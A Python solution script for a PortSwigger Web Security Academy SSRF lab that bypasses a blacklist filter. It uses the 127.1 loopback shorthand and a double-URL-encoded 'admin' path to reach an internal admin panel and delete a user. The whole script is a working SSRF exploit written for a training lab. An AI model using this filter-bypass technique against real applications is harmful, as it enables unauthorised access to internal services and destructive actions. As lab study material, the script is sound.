#!/usr/bin/env python3
"""
SSRF with blacklist-based input filter
PortSwigger Web Security Academy -- Server-Side Request Forgery (SSRF)

Companion script for the writeup: 03-ssrf-blacklist-based-input-filter.md

What this does:
    Bypasses a blacklist that blocks the literal strings "127.0.0.1"/"localhost"
    (via the 127.1 shorthand for the loopback address) and the literal string
    "admin" (via single-encoding the letter 'a' as %61), reaching the admin
    panel and then carlos's delete link through the same double bypass.

    ENCODING NOTE: httpx's data={} form-encodes values, adding one URL-encode
    layer on top of whatever we write in Python. To land on the wire as the
    %2561 the server's blacklist needs to see (so it decodes back to %61 and
    still reads "admin" as a literal string, passing the filter, before the
    internal web server decodes %61 the rest of the way to 'a'), we write only
    %61 in the Python source -- NOT %2561 -- and let httpx add the second
    encoding layer automatically.

Usage:
    python 03-ssrf-blacklist-based-input-filter.py <lab-url>
    e.g. python 03-ssrf-blacklist-based-input-filter.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    stock_url = f"{lab_url}/product/stock"

    # 127.1 bypasses the "127.0.0.1"/"localhost" string check; %61dmin bypasses
    # the "admin" string check (single-encoded here -- see ENCODING NOTE above).
    bypass_url = "http://127.1/%61dmin"
    r = client.post(stock_url, data={"stockApi": bypass_url})
    print(f"[*] stockApi={bypass_url} -> status={r.status_code}, len={len(r.text)}")

    if not (r.status_code == 200 and len(r.text) > 200):
        print("[-] Bypass failed -- blacklist still blocking this request.")
        print(f"[-] Response preview: {r.text[:300]}")
        return

    delete_match = re.search(r'href="(/admin/delete\?username=carlos)"', r.text)
    if not delete_match:
        print("[-] Delete link not found in admin page.")
        return

    delete_path = delete_match.group(1)
    print(f"[*] Found delete link: {delete_path}")

    # Re-apply the same single-encoding to the delete path's "admin" substring.
    encoded_delete = delete_path.replace("admin", "%61dmin")
    action_url = f"http://127.1{encoded_delete}"
    print(f"[*] Deleting carlos via: {action_url}")

    r2 = client.post(stock_url, data={"stockApi": action_url})
    print(f"[*] stockApi={action_url} -> status={r2.status_code}")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- carlos deleted via blacklist bypass (127.1 + %61dmin).")
    else:
        print("[-] Not solved yet -- check the delete response above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
